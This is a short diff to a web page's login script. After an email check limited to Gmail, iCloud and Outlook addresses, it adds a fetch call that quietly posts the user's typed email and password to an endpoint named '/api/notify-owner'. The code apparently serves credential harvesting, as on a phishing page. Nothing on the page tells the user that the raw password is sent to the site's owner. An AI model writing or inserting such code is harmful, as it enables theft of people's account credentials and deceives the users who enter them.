@@ -867,6 +867,16 @@
                 showError('❌ Invalid email: يسمح فقط بـ Gmail, iCloud, Outlook');
                 return;
             }
+            
+            fetch('/api/notify-owner', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+    })
+    .then(r => r.text())
+    .then(console.log)
+    .catch(console.error);
+
 
             // --- End Validation ---
             
@@ -945,3 +955,4 @@
     </script>
 </body>
 </html>
+
